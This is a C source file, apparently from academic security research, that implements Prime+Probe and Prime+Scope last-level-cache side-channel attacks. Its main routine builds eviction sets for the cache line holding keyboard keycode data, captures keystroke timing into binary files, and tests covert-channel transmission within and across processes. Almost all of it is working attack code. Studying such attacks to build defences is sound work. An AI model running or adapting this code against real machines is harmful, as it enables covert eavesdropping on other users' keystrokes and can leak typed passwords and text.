#define _DEFAULT_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/eviction.h"
#include "../lib/l3pp.h"
#include "../lib/utils.h"

#define TRIALS 1000

#define PRIME_PROBE 0
#define PRIME_SCOPE 1

void *mapping_start;
EvictionSet **es_list;
unsigned int core_id = 0;
FILE *file;

void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
  fclose(file);
  free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}
void handle_sigint(int sig) {
  safe_print("SIGINT received, cleanup process initiated\n");
  cleanup(es_list, mapping_start, file);
  exit(1);
}

void test_eviction_set(void) {
  uint8_t victim = 0x37;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = threshold_from_flush(&victim);
  if (!get_minimal_set(&victim, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  // Bring the victim into the cache
  uint8_t var2 = victim ^ 0xF7;

  // Access eviction set
  NumList *timings = new_num_list(TRIALS);
  evict_and_time(cl_set, &victim, timings, true);

  // Report median and mean times
  printf("Timings after accessing eviction set:\n");
  print_stats(timings);

  int evictions = 0;

  for (int i = 0; i < TRIALS; i++) {
    if (timings->nums[i] > threshold) {
      evictions++;
    }
  }

  printf("Successfully evicted %u/%u trials.\n", evictions, TRIALS);

  deep_free_cl_set(cl_set);
  free_num_list(timings);
}

void test_eviction_and_pp(void) {
  uint8_t *target = malloc(sizeof(uint8_t *));
  printf("target: %p\n", target);
  uintptr_t pa = pointer_to_pa(target);

  // map 64 2 MB pages to ge 256 candidate lines
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }

  printf("memory mapped: %p\n", mapping_start);

  int threshold = threshold_from_flush(target);

  CacheLineSet *cl_set;
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("unable to obtain eviction set\n");
  }

  for (int i = 0; i < cl_set->size; i++) {
    printf("%p\n", cl_set->cache_lines[i]);
  }

  EvictionSet *es = new_eviction_set(cl_set);
  uint64_t time = evict_and_time_once(es, target);
  printf("threshold: %d, evict_time: %ld\n", threshold, time);

  sleep(1);

  access_set(es);
  volatile uint8_t tmp = *target;
  int list[16];
  probe(es, threshold);

  sleep(1);
  access_set(es);
  probe(es, threshold);

  free(target);
  deep_free_es(es);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}

void init_mapping() {
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }
}

void test_find_all_eviction_sets(int set) {
  printf("set: %d\n", set);

  es_list = get_all_slices_eviction_sets(mapping_start, set);

  for (int i = 0; i < 4; i++) {
    printf("Eviction Set %d: \n", i);
    print_eviction_set(es_list[i]->cache_lines);
  }
}

int get_evset_index(int slice) {
  int ret = -1;
  for (int i = 0; i < 4; i++) {
    CacheLine *iter = es_list[i]->head;
    if (slice == get_i7_2600_slice(pointer_to_pa((void *)iter))) {
      ret = i;
    }
  }
  return ret;
}

uint64_t *profile_slices(int set) {
  test_find_all_eviction_sets(set);

  sleep(5);
  int slice_hit_count[4];
  uint64_t timestamps[64 * 64];
  char filename[30];

  uint64_t *size = malloc(4 * sizeof(uint64_t));
  int threshold = threshold_from_flush((void *)es_list[0]->head);
  uint64_t start_time = __rdtscp(&core_id);
  flush_timestamps(&start_time, sizeof(uint64_t), filename);
  for (int i = 0; i < 4; i++) {
    int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
    printf("testing slice index: %d\n", slice);
    size[slice] = prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, timestamps,
                              64 * 64, threshold);
    sprintf(filename, "output%d.bin", slice);
    flush_timestamps(timestamps, size[slice], filename);
  }

  return size;
}

uint64_t measure_keystroke(int threshold) {
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
  int eslist_index = get_evset_index(slice);
  uint64_t keystrokes[64 * 64];

  uint64_t num_keystrokes = 0;
  uint64_t start_time = __rdtscp(&core_id);
  flush_timestamps(&start_time, 1, "pp_keystrokes.bin");
  printf("please start typing\n");
  for (int i = 0; i < 10; i++) {
    // takes around 1s to fill up 1 MB buffer
    uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
                                keystrokes, 64 * 64, threshold);
    flush_timestamps(keystrokes, size, "pp_keystrokes.bin");
    num_keystrokes += size;
  }
  printf("\nnum_keystrokes: %lu\n", num_keystrokes);
  return start_time;
}

void prep(EvictionSet *evset) {
  // for (int i = 0; i < 5; i++) {
  //   volatile uint8_t x = *(uint8_t *)evset->head;
  // }
  CacheLine *start = evset->head->next;
  for (int i = 0; i < 5; i++) {
    CacheLine *iter = start;
    while (iter != NULL) {
      iter = iter->next;
    }
    iter = evset->tail;
    for (int k = 0; k < 10; k++) {
      iter = iter->previous;
    }
  }
  _mm_prefetch(evset->head, _MM_HINT_NTA);
}

uint64_t *prime_scope_many_sets(EvictionSet **es_list, int num_sets,
                                int associativity, int size,
                                uint64_t detect_timestamps[num_sets][size],
                                int threshold) {

  unsigned int core_id = 0;

  int prev[num_sets];
  int current[num_sets];
  uint64_t *hit_count = malloc(num_sets * sizeof(uint64_t));
  for (int i = 0; i < num_sets; i++) {
    prev[i] = 0;
    current[i] = 0;
    hit_count[i] = 0;
  }

  // prime step for all sets
  for (int i = 0; i < num_sets; i++) {
    prep(es_list[i]);
  }

  // compute second based on number of sets
  uint64_t SECOND = 1024 * 1024 / num_sets;

  // prime and probe each set
  for (int i = 0; i < SECOND; i++) {
    for (int j = 0; j < num_sets; j++) {
      prep(es_list[j]);
      uint64_t start = __rdtscp(&core_id);
      while (__rdtscp(&core_id) - start < 5000)
        ;
      current[j] = time_load((uint8_t *)es_list[j]->head) > threshold;
      if (current[j] == 1 && prev[j] == 1) {
        current[j] = 0;
        prev[j] = 1;
      } else if (current[j] == 1) {
        detect_timestamps[j][hit_count[j]] = __rdtscp(&core_id);
        hit_count[j]++;
        prev[j] = 1;
      } else {
        prev[j] = 0;
      }
    }
  }
  return hit_count;
}

void measure_keystroke_without_slice(int num_slices, int seconds,
                                     int max_detections, int threshold,
                                     int attack_type) {
  int set = (KBD_KEYCODE_ADDR >> LINE_OFFSET_BITS) &
            ((1 << KABYLAKE_CACHE_SET_BITS) - 1);

  printf("set: %d\n", set);

  uint64_t keystrokes[num_slices][max_detections];
  uint64_t total_strokes[num_slices];

  char filename[30]; // buffer to store output filename

  // store initial timestamp for each file
  uint64_t start_time = __rdtscp(&core_id);
  for (int i = 0; i < num_slices; i++) {
    total_strokes[i] = 0;
    sprintf(filename, "captured_keystrokes_%c.bin", i + '0');
    flush_timestamps(&start_time, 1, filename);
  }

  // start measurement for keystrokes
  printf("please start typing\n");
  for (int i = 0; i < seconds; i++) { // each iteration is 8 seconds
    uint64_t *num_strokes;
    if (attack_type == PRIME_PROBE) {
      num_strokes = prime_probe_many_sets(
          es_list, KABYLAKE_NUM_SLICES, KABYLAKE_ASSOCIATIVITY, max_detections,
          keystrokes, threshold);
    } else {
      num_strokes = prime_scope_many_sets(
          es_list, KABYLAKE_NUM_SLICES, KABYLAKE_ASSOCIATIVITY, max_detections,
          keystrokes, threshold);
      i += 2;
    }

    for (int j = 0; j < num_slices; j++) {
      sprintf(filename, "captured_keystrokes_%c.bin", j + '0');
      flush_timestamps(keystrokes[j], num_strokes[j], filename);
      total_strokes[j] += num_strokes[j];
    }
    free(num_strokes);
  }

  // output number of keystrokes for
  for (int i = 0; i < num_slices; i++) {
    printf("%lu\n", total_strokes[i]);
  }
}

void prime_scope_tests(EvictionSet *evset, int threshold, int set) {
  for (int j = 0; j < 10; j++) {
    access_set(evset);
    volatile uint8_t x =
        *(uint8_t *)(mapping_start + (set << LINE_OFFSET_BITS));
    int result = probe(evset, threshold);
    printf("simple probe after conflict: %d\n", result);

    usleep(10);

    CacheLine *start = evset->head->next;
    access_set(evset);
    for (int i = 0; i < 5; i++) {
      CacheLine *iter = start;
      while (iter != NULL) {
        iter = iter->next;
      }
      iter = evset->tail;
      for (int k = 0; k < 10; k++) {
        iter = iter->previous;
      }
    }
    x = *(uint8_t *)(mapping_start + (set << LINE_OFFSET_BITS));
    // usleep(10);
    uint64_t access_time = time_load((uint8_t *)evset->head);
    printf("access head with conflict: %lu\n", access_time);

    usleep(10);
    access_set(evset);
    for (int i = 0; i < 5; i++) {
      CacheLine *iter = start;
      while (iter != NULL) {
        iter = iter->next;
      }
      iter = evset->tail;
      for (int k = 0; k < 10; k++) {
        iter = iter->previous;
      }
    }

    access_time = time_load((uint8_t *)evset->head);
    printf("access head without conflict: %lu\n", access_time);

    usleep(10);
    access_set(evset);
    for (int i = 0; i < 5; i++) {
      CacheLine *iter = start;
      while (iter != NULL) {
        iter = iter->next;
      }
      iter = evset->tail;
      for (int k = 0; k < 10; k++) {
        iter = iter->previous;
      }
    }
    _mm_prefetch(evset->head,
                 _MM_HINT_NTA); // prefetch scope line into L1 without updating
                                // age in LLC

    access_time = time_load((uint8_t *)evset->head);
    printf("prime_prefetch_scope without conflict: %lu\n", access_time);

    usleep(10);
    access_set(evset);
    for (int i = 0; i < 5; i++) {
      CacheLine *iter = start;
      while (iter != NULL) {
        iter = iter->next;
      }
      iter = evset->tail;
      for (int k = 0; k < 10; k++) {
        iter = iter->previous;
      }
    }
    _mm_prefetch(evset->head,
                 _MM_HINT_NTA); // prefetch scope line into L1 without updating
                                // age in LLC
    x = *(uint8_t *)(mapping_start + (set << LINE_OFFSET_BITS));
    access_time = time_load((uint8_t *)evset->head);
    printf("prime_prefetch_scope with conflict: %lu\n", access_time);

    NumList *nl = new_num_list(10);
    prep(evset);
    for (int i = 0; i < 10; i++) {
      _mm_prefetch(evset->head, _MM_HINT_NTA);
      push_num(nl, time_load((uint8_t *)evset->head));
    }
    _mm_prefetch(evset->head, _MM_HINT_NTA);
    x = *(uint8_t *)(mapping_start + (set << LINE_OFFSET_BITS));
    access_time = time_load((uint8_t *)evset->head);

    print_num_list(nl);
    printf("scope with conflict after multiple access: %lu\n", access_time);
  }
}

uint64_t get_prep_duration(EvictionSet *evset) {
  uint64_t start = __rdtscp(&core_id);
  prep(evset);
  return __rdtscp(&core_id) - start;
}

void within_process_transmit_test(EvictionSet *evset, int threshold) {
  uint8_t probemap[128];
  for (int i = 0; i < 128; i++) {
    probemap[i] = 0;
  }
  int prev = 1;
  int correct_hit = 0;
  int total_hit = 0;

  for (int i = 0; i < 128; i++) {
    for (int j = 0; j < 128; j++) {
      int index = i * 128 + j;
      prep(evset);
      if (index % 8 == 0) {
        volatile uint8_t x =
            *(volatile uint8_t *)(mapping_start + (31 << LINE_OFFSET_BITS));
      }
      int access_time = time_load((uint8_t *)evset->head);
      prev = access_time > threshold;
      probemap[j] = prev;
      total_hit += prev;
    }
    for (int j = 0; j < 128; j += 8) {
      correct_hit += probemap[j];
    }
    for (int j = 0; j < 128; j++) {
      printf("%d", probemap[j]);
    }
    printf("\n");
  }
  printf("correct-hit rate: %lf\n", (correct_hit) / (double)(128 * 128 / 8));
  printf("false-positive rate: %lf\n",
         (double)(total_hit - correct_hit) / (128 * 128));
}

void cross_process_transmit_test(EvictionSet *evset, int threshold) {
  printf("done test setup and start measuring\n");
  sleep(5);
  char detect_map[128][128];
  for (int i = 0; i < 128; i++) {
    for (int j = 0; j < 128; j++) {
      int index = i * 128 + j;
      prep(evset);
      uint64_t start = __rdtscp(&core_id);
      while (__rdtscp(&core_id) - start < 5000)
        ;
      int access_time = time_load((uint8_t *)evset->head);
      detect_map[i][j] = access_time > threshold;
    }
  }

  for (int i = 0; i < 128; i++) {
    for (int j = 0; j < 128; j++) {
      printf("%d", detect_map[i][j]);
    }
    printf("\n");
  }
}

int main(int argc, char **argv) {

  init_mapping();
  int threshold = threshold_from_flush(mapping_start);

  /* Prime+Scope tests */
  // TODO: Convert Prime+Scope to do Keystroke Timing
  //
  // CacheLineSet *cl_set = new_cl_set();
  // if (!get_minimal_set((mapping_start + (249 << LINE_OFFSET_BITS)), &cl_set,
  //                      threshold)) {
  //   printf("Failed to find minimal eviction set for the given target\n");
  // }
  //
  // EvictionSet *evset = new_eviction_set(cl_set);
  //
  // prime_scope_tests(evset, threshold, 249);
  // uint64_t prep_duration = get_prep_duration(evset);
  // within_process_transmit_test(evset, threshold);
  // cross_process_transmit_test(evset, threshold);
  //
  // deep_free_es(evset);

  /* Prime+Probe Keystroke Timing */

  uint64_t keystrokes[KABYLAKE_NUM_SLICES][4096];
  int set = (KBD_KEYCODE_ADDR >> LINE_OFFSET_BITS) &
            ((1 << KABYLAKE_CACHE_SET_BITS) - 1);
  printf("%d\n", set);

  es_list = get_all_slices_eviction_sets(mapping_start, set);
  printf("eviction set found, please start typing\n");

  int attack_type = PRIME_PROBE;
  if (argc == 2 && !strcmp(argv[1], "ps")) {
    printf("%s\n", argv[1]);
    attack_type = PRIME_SCOPE;
  }

  measure_keystroke_without_slice(KABYLAKE_NUM_SLICES, 20, 4096, threshold,
                                  attack_type);

  free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
  return 0;
}
